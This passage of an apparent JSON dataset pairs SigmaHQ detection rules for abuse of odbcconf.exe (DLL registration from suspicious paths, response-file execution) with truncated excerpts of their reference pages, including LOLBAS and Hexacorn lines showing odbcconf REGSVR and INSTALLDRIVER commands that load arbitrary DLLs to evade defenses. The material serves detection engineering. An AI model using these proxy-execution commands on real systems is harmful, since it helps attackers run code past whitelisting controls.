      "id": "6b65c28e-11f3-46cb-902a-68f2cafaf474",
      "status": "test",
      "description": "Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
        "https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Registration\\CRMLog",
            ":\\Windows\\System32\\com\\dmp\\",
            ":\\Windows\\System32\\FxsTmp\\",
            ":\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\",
            ":\\Windows\\System32\\spool\\drivers\\color\\",
            ":\\Windows\\System32\\spool\\PRINTERS\\",
            ":\\Windows\\System32\\spool\\SERVERS\\",
            ":\\Windows\\System32\\Tasks_Migrated\\",
            ":\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\SysWOW64\\com\\dmp\\",
            ":\\Windows\\SysWOW64\\FxsTmp\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_exec_susp_locations.yml"
  },
  "300": {
    "url": "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
    "markdown": "# Emails with Backdoor Targets Russian Businesses **Malware** **August 07, 2017** --- A malicious email campaign against Russian-speaking enterprises is employing a combination of exploits and Windows components to deliver a new backdoor that allows attackers to take over the affected system. The attack abuses various legitimate Windows components to run unauthorized scripts; this is meant to make detection and blocking more challenging, particularly by whitelisting-based solutions. We’ve observed at least five runs from June 23 to July 27, 2017, each of which sent several malicious emails per target. Affected industries were financial institutions, including banks, and mining firms. Of",
    "sigma_rule": {
      "title": "Odbcconf.EXE Suspicious DLL Location",
      "id": "6b65c28e-11f3-46cb-902a-68f2cafaf474",
      "status": "test",
      "description": "Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
        "https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Registration\\CRMLog",
            ":\\Windows\\System32\\com\\dmp\\",
            ":\\Windows\\System32\\FxsTmp\\",
            ":\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\",
            ":\\Windows\\System32\\spool\\drivers\\color\\",
            ":\\Windows\\System32\\spool\\PRINTERS\\",
            ":\\Windows\\System32\\spool\\SERVERS\\",
            ":\\Windows\\System32\\Tasks_Migrated\\",
            ":\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\SysWOW64\\com\\dmp\\",
            ":\\Windows\\SysWOW64\\FxsTmp\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_exec_susp_locations.yml"
  },
  "301": {
    "url": "https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/",
    "markdown": "# Raspberry Robin and Dridex: Two birds of a feather IBM Security Managed Detection and Response (MDR) observations coupled with IBM Security X-Force malware research sheds additional light on the mysterious objectives of the operators behind the Raspberry Robin worm. Based on a comparative analysis between a downloaded Raspberry Robin DLL and a Dridex malware loader, the results show that they are similar in structure and functionality. Thus, IBM Security research draws another link between the Raspberry Robin infections and the Russia-based cybercriminal group ‘Evil Corp,’ which is the same group behind the Dridex Malware, suggesting that Evil Corp is",
    "sigma_rule": {
      "title": "Odbcconf.EXE Suspicious DLL Location",
      "id": "6b65c28e-11f3-46cb-902a-68f2cafaf474",
      "status": "test",
      "description": "Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
        "https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Registration\\CRMLog",
            ":\\Windows\\System32\\com\\dmp\\",
            ":\\Windows\\System32\\FxsTmp\\",
            ":\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\",
            ":\\Windows\\System32\\spool\\drivers\\color\\",
            ":\\Windows\\System32\\spool\\PRINTERS\\",
            ":\\Windows\\System32\\spool\\SERVERS\\",
            ":\\Windows\\System32\\Tasks_Migrated\\",
            ":\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\SysWOW64\\com\\dmp\\",
            ":\\Windows\\SysWOW64\\FxsTmp\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_exec_susp_locations.yml"
  },
  "302": {
    "url": "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
    "markdown": "# ODBCCONF.EXE ODBCCONF.exe is a command-line tool that allows you to configure ODBC drivers and data source names. > **Note** > ODBCCONF.exe will be removed in a future version of Windows Data Access Components. Avoid using this feature, and plan to modify applications that currently use this feature. You can use PowerShell commands to manage drivers and data sources. For more information about these PowerShell commands, see Windows Data Access Components cmdlets. ## Syntax ``` ODBCCONF [switches] action ``` ## Arguments * *switches* Zero or more switch options. For the list of available switches, see the Remarks section, later in",
    "sigma_rule": {
      "title": "Potentially Suspicious DLL Registered Via Odbcconf.EXE",
      "id": "ba4cfc11-d0fa-4d94-bf20-7c332c412e76",
      "related": [
        {
          "id": "9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesn't contain a \".dll\" extension. Which is often used as a method to evade defenses.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "REGSVR "
        },
        "filter_main_dll_ext": {
          "CommandLine|contains": ".dll"
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_register_dll_regsvr_susp.yml"
  },
  "303": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe Used in Windows for managing ODBC connections ### Paths: - `C:\\Windows\\System32\\odbcconf.exe` - `C:\\Windows\\SysWOW64\\odbcconf.exe` ### Resources: - https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b - https://github.com/woanware/application-restriction-bypasses - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/ ### Detections: - Sigma: proc_creation_win_odbcconf_response_file.yml - Sigma: proc_creation_win_odbcconf_response_file_susp.yml - Elastic: defense_evasion_unusual_process_network_connection.toml - Elastic: defense_evasion_network_connection_from_windows_binary.toml ## Execute 1. **Execute DllREgisterServer from DLL specified.** ``` odbcconf /a {REGSVR c:\\test\\test.dll} ``` **Properties:** - **Use case:** Execute dll file using technique that can evade defensive counter measures - **Privileges required:** User - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11 - **ATT&CK® technique:** T1218.008: Odbcconf - **Tags:** Execute: DLL 2. **Install a driver and load",
    "sigma_rule": {
      "title": "Potentially Suspicious DLL Registered Via Odbcconf.EXE",
      "id": "ba4cfc11-d0fa-4d94-bf20-7c332c412e76",
      "related": [
        {
          "id": "9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesn't contain a \".dll\" extension. Which is often used as a method to evade defenses.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "REGSVR "
        },
        "filter_main_dll_ext": {
          "CommandLine|contains": ".dll"
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_register_dll_regsvr_susp.yml"
  },
  "304": {
    "url": "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
    "markdown": "# Emails with Backdoor Targets Russian Businesses **Malware** **August 07, 2017** --- A malicious email campaign against Russian-speaking enterprises is employing a combination of exploits and Windows components to deliver a new backdoor that allows attackers to take over the affected system. The attack abuses various legitimate Windows components to run unauthorized scripts; this is meant to make detection and blocking more challenging, particularly by whitelisting-based solutions. We’ve observed at least five runs from June 23 to July 27, 2017, each of which sent several malicious emails per target. Affected industries were financial institutions, including banks, and mining firms. Of",
    "sigma_rule": {
      "title": "Potentially Suspicious DLL Registered Via Odbcconf.EXE",
      "id": "ba4cfc11-d0fa-4d94-bf20-7c332c412e76",
      "related": [
        {
          "id": "9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesn't contain a \".dll\" extension. Which is often used as a method to evade defenses.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "REGSVR "
        },
        "filter_main_dll_ext": {
          "CommandLine|contains": ".dll"
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_register_dll_regsvr_susp.yml"
  },
  "305": {
    "url": "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
    "markdown": "# ODBCCONF.EXE ODBCCONF.exe is a command-line tool that allows you to configure ODBC drivers and data source names. > **Note** > ODBCCONF.exe will be removed in a future version of Windows Data Access Components. Avoid using this feature, and plan to modify applications that currently use this feature. You can use PowerShell commands to manage drivers and data sources. For more information about these PowerShell commands, see Windows Data Access Components cmdlets. ## Syntax ``` ODBCCONF [switches] action ``` ## Arguments * *switches* Zero or more switch options. For the list of available switches, see the Remarks section, later in",
    "sigma_rule": {
      "title": "Response File Execution Via Odbcconf.EXE",
      "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
      "related": [
        {
          "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
          "type": "similar"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control",
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "selection_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file.yml"
  },
  "306": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe Used in Windows for managing ODBC connections ### Paths: - `C:\\Windows\\System32\\odbcconf.exe` - `C:\\Windows\\SysWOW64\\odbcconf.exe` ### Resources: - https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b - https://github.com/woanware/application-restriction-bypasses - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/ ### Detections: - Sigma: proc_creation_win_odbcconf_response_file.yml - Sigma: proc_creation_win_odbcconf_response_file_susp.yml - Elastic: defense_evasion_unusual_process_network_connection.toml - Elastic: defense_evasion_network_connection_from_windows_binary.toml ## Execute 1. **Execute DllREgisterServer from DLL specified.** ``` odbcconf /a {REGSVR c:\\test\\test.dll} ``` **Properties:** - **Use case:** Execute dll file using technique that can evade defensive counter measures - **Privileges required:** User - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11 - **ATT&CK® technique:** T1218.008: Odbcconf - **Tags:** Execute: DLL 2. **Install a driver and load",
    "sigma_rule": {
      "title": "Response File Execution Via Odbcconf.EXE",
      "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
      "related": [
        {
          "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
          "type": "similar"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control",
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "selection_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file.yml"
  },
  "307": {
    "url": "https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control",
    "markdown": "# THREAT ANALYSIS REPORT: Bumblebee Loader – The High Road to Enterprise Domain Control The Cybereason Global Security Operations Center (GSOC) Team issues Cybereason Threat Analysis Reports to inform on impacting threats. The Threat Analysis Reports investigate these threats and provide practical recommendations for protecting against them. In this Threat Analysis report, Cybereason GSOC team analysts have analyzed a case that involved a Bumblebee Loader infection. Following this introduction, we describe in detail the attack chain from the initial Bumblebee infection to the compromise of the entire network. ## Key Findings - **User-Driven Execution:** The majority of the infections with",
    "sigma_rule": {
      "title": "Response File Execution Via Odbcconf.EXE",
      "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
      "related": [
        {
          "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
          "type": "similar"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control",
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "selection_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file.yml"
  },
  "308": {
    "url": "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/",
    "markdown": "# ODBCConf – Lolbin Trifecta Posted on 2020-08-23 I posted about ODBCConf before and then posted again on Twitter. The Twitter bit was about REGSVR: ``` odbcconf.exe /a {REGSVR c:\\test\\test.dll} ``` – loads a DLL At that time I looked at other ACTIONS accepted by this tool, but didn’t explore them fully. Of course, the one I did want to explore the most was INSTALLDRIVER, but put it on a backburner. I eventually tested it today and here’s the result: ``` ODBCConf /ld foo /a {INSTALLDRIVER \"test|Driver=c:\\test\\test64.dll|APILevel=2\"} ``` This will set up ‘test’ driver entry in Registry. We then need",
    "sigma_rule": {
      "title": "Response File Execution Via Odbcconf.EXE",
      "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
      "related": [
        {
          "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
          "type": "similar"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control",
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "selection_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file.yml"
  },
  "309": {
    "url": "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
    "markdown": "# ODBCCONF.EXE ODBCCONF.exe is a command-line tool that allows you to configure ODBC drivers and data source names. > **Note** > ODBCCONF.exe will be removed in a future version of Windows Data Access Components. Avoid using this feature, and plan to modify applications that currently use this feature. You can use PowerShell commands to manage drivers and data sources. For more information about these PowerShell commands, see Windows Data Access Components cmdlets. ## Syntax ``` ODBCCONF [switches] action ``` ## Arguments * *switches* Zero or more switch options. For the list of available switches, see the Remarks section, later in",
    "sigma_rule": {
      "title": "Suspicious Response File Execution Via Odbcconf.EXE",
      "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
      "related": [
        {
          "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
          "type": "derived"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file with a non-\".rsp\" extension.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "filter_main_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "filter_main_runonce_odbc": {
          "ParentImage": "C:\\Windows\\System32\\runonce.exe",
          "Image": "C:\\Windows\\System32\\odbcconf.exe",
          "CommandLine|contains": ".exe /E /F \"C:\\WINDOWS\\system32\\odbcconf.tmp\""
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file_susp.yml"
  },
  "310": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe Used in Windows for managing ODBC connections ### Paths: - `C:\\Windows\\System32\\odbcconf.exe` - `C:\\Windows\\SysWOW64\\odbcconf.exe` ### Resources: - https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b - https://github.com/woanware/application-restriction-bypasses - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/ ### Detections: - Sigma: proc_creation_win_odbcconf_response_file.yml - Sigma: proc_creation_win_odbcconf_response_file_susp.yml - Elastic: defense_evasion_unusual_process_network_connection.toml - Elastic: defense_evasion_network_connection_from_windows_binary.toml ## Execute 1. **Execute DllREgisterServer from DLL specified.** ``` odbcconf /a {REGSVR c:\\test\\test.dll} ``` **Properties:** - **Use case:** Execute dll file using technique that can evade defensive counter measures - **Privileges required:** User - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11 - **ATT&CK® technique:** T1218.008: Odbcconf - **Tags:** Execute: DLL 2. **Install a driver and load",
    "sigma_rule": {
      "title": "Suspicious Response File Execution Via Odbcconf.EXE",
      "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
      "related": [
        {
          "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
          "type": "derived"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file with a non-\".rsp\" extension.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "filter_main_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
